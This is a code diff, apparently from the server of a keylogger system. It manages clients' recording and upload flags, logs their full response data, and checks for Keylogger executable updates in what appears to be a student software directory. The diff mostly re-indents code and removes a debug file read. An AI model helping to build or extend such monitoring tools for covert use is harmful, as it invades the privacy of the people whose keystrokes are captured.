@@ -759,24 +759,25 @@ class ClientManager {
     }
 
     handleResponse(client, response) {
-        client.lastSeen = new Date();
-        updateLastSeen(client.id).catch(e => this.logger.error(e));
+    client.lastSeen = new Date();
+    updateLastSeen(client.id).catch(e => this.logger.error(e));
+    this.logger.silly(`客户端 ${client.id} 响应数据: ${JSON.stringify(response)}`);
 
-        if (response.status === 'ok' && response.data) {
-            if (response.data.recording !== undefined) {
-                client.recording = response.data.recording;
-            }
-            if (response.data.upload_enabled !== undefined) {
-                client.uploadEnabled = response.data.upload_enabled;
-            }
+    if (response.status === 'ok' && response.data) {
+        if (response.data.recording !== undefined) {
+            client.recording = response.data.recording;
         }
-
-        this.broadcastToWeb({
-            type: 'client_response',
-            clientId: client.id,
-            response
-        });
+        if (response.data.upload_enabled !== undefined) {
+            client.uploadEnabled = response.data.upload_enabled;
+        }
     }
+
+    this.broadcastToWeb({
+        type: 'client_response',
+        clientId: client.id,
+        response
+    });
+}
 
     sendCommand(clientId, command) {
         const client = this.clients.get(clientId);
@@ -1287,16 +1288,6 @@ app.get('/api/update/check', asyncHandler(async (req, res) => {
                 } catch (error) {
                     logger.error(`检查目录 ${dir} 失败`, { error: error.message, stack: error.stack });
                 }
-            }
-            
-            // 增加调试：直接检查用户提到的具体文件
-            try {
-                const testFilePath = '/学生目录/软件/键盘记录器/Keylogger_v1.0.1.exe';
-                logger.info(`尝试直接检查文件: ${testFilePath}`);
-                const testFile = await alistClient.readFile(testFilePath);
-                logger.info(`成功读取文件: ${testFilePath}, 大小: ${testFile.length} 字节`);
-            } catch (error) {
-                logger.error(`直接检查文件失败: ${error.message}`);
             }
             
             // 过滤出 Keylogger 可执行文件并解析版本号
